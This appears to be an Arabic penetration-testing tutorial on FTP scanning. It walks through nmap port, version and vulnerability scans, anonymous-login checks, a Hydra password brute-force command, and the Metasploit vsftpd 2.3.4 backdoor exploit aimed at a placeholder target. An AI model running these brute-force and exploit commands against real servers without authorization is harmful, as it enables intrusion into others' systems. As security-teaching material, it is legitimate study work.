# 🔍 **فحص FTP - FTP Scanning**

## ✅ **ما هو FTP؟**

**FTP (File Transfer Protocol)** هو بروتوكول يستخدم لنقل الملفات بين جهاز المستخدم والخادم عبر الشبكة. يعمل عادةً على **المنفذ 21**، ولكن يمكنه استخدام منافذ أخرى عند تشغيله في **وضع Active أو Passive**.

✅ **أهمية فحص FTP؟**  
📌 معرفة ما إذا كان FTP يعمل على الخادم  
📌 اكتشاف الإعدادات الخاطئة مثل السماح بالوصول المجهول (**Anonymous Login**)  
📌 التحقق من وجود **ثغرات معروفة** في خادم FTP  
📌 تحديد إمكانية استخدام FTP للوصول إلى بيانات حساسة

---

# 🛠️ **أدوات فحص FTP بالتفصيل**

## **1️⃣ اكتشاف خادم FTP باستخدام [[Nmap]]**

📌 **الهدف:** معرفة ما إذا كان خادم FTP يعمل، وإصدار البرنامج، واكتشاف أي ثغرات محتملة.

🔹 **فحص ما إذا كان المنفذ 21 مفتوحًا:**

```bash
nmap -p 21 target.com
```

📌 **إذا ظهر "open"، فهذا يعني أن FTP يعمل على هذا الخادم.**

🔹 **الحصول على إصدار خادم FTP:**

```bash
nmap -p 21 -sV target.com
```

📌 **يعرض إصدار FTP مثل "vsftpd 3.0.3" أو "ProFTPD".**

🔹 **البحث عن ثغرات أمنية في FTP:**

```bash
nmap --script=ftp-vuln* target.com
```

📌 **يحدد إذا كان الخادم به ثغرات مثل CVE-2011-2523 في vsftpd.**

✅ **الخلاصة:**  
**Nmap** هو أداة قوية لمعرفة **ما إذا كان FTP نشطًا، وما هو إصداره، وهل به ثغرات أمنية؟**

---

## **2️⃣ تجربة تسجيل الدخول كمجهول (Anonymous Login)**

📌 بعض خوادم FTP تسمح بتسجيل الدخول بدون اسم مستخدم أو كلمة مرور!

🔹 **محاولة تسجيل الدخول عبر FTP:**

```bash
ftp target.com
```

ثم إدخال:

```
Name: anonymous
Password: anonymous
```

📌 **إذا نجح الدخول، فهذا يشير إلى ضعف أمني خطير، حيث يمكن لأي شخص تحميل أو تنزيل الملفات.**

✅ **الخلاصة:**  
يجب **التحقق مما إذا كان الخادم يسمح بتسجيل الدخول كمجهول**، لأنه يسمح بسرقة الملفات.

---

## **3️⃣ اختبار قوة كلمات المرور باستخدام [[Hydra]]**

📌 **الهدف:** تجربة تسجيل الدخول باستخدام كلمات مرور ضعيفة.

🔹 **تنفيذ هجوم تخمين كلمات المرور:**

```bash
hydra -l admin -P passwords.txt ftp://target.com
```

📌 **يحاول تسجيل الدخول باستخدام قائمة كلمات مرور موجودة في "passwords.txt".**

✅ **الخلاصة:**  
**Hydra** يساعد في **اختبار مدى قوة كلمات مرور FTP**، مما يساعد في تحديد الحسابات الضعيفة.

---

## **4️⃣ تحليل إعدادات FTP باستخدام [[Metasploit]]**

📌 **الهدف:** البحث عن ثغرات أمنية أو إعدادات خاطئة في خادم FTP.

🔹 **فتح Metasploit والبحث عن ثغرات FTP:**

```bash
msfconsole
search ftp
```

📌 **يظهر قائمة بالثغرات المحتملة في خوادم FTP.**

🔹 **استخدام وحدة استغلال مثل vsftpd 2.3.4 backdoor:**

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST target.com
exploit
```

📌 **إذا كان الخادم يعاني من هذه الثغرة، فسيمنحك وصولًا مباشرًا.**

✅ **الخلاصة:**  
**Metasploit** يساعد في **البحث عن ثغرات واستغلالها في خوادم FTP، مما يسمح بفهم المخاطر الأمنية المحتملة.**

---

# 🚀 **📌 خطوات عملية لاختبار اختراق FTP**

✅ **1️⃣ اكتشاف ما إذا كان منفذ FTP مفتوحًا:**

```bash
nmap -p 21 -sV target.com
```

✅ **2️⃣ اختبار تسجيل الدخول المجهول:**

```bash
ftp target.com
```

ثم إدخال:

```
Name: anonymous
Password: anonymous
```

✅ **3️⃣ اختبار قوة كلمات المرور على FTP:**

```bash
hydra -l admin -P passwords.txt ftp://target.com
```

✅ **4️⃣ البحث عن ثغرات FTP تلقائيًا:**

```bash
nmap --script=ftp-vuln* target.com
```

✅ **5️⃣ استغلال الثغرات باستخدام Metasploit:**

```bash
msfconsole
search ftp
```

---

# 🎯 **📌 الخلاصة النهائية**

📌 فحص FTP هو تحليل **الخوادم التي تعمل ببروتوكول FTP** لاكتشاف المنافذ المفتوحة، إصدار الخادم، الإعدادات الخاطئة، والثغرات الأمنية.  
📌 الأدوات المستخدمة تشمل **Nmap, Hydra, Metasploit, وFTP Client**.  
📌 الهدف هو **التأكد من تأمين FTP ومنع تسجيل الدخول المجهول والثغرات الأمنية.**

🔥 **ابدأ بالتجربة الآن! 🚀**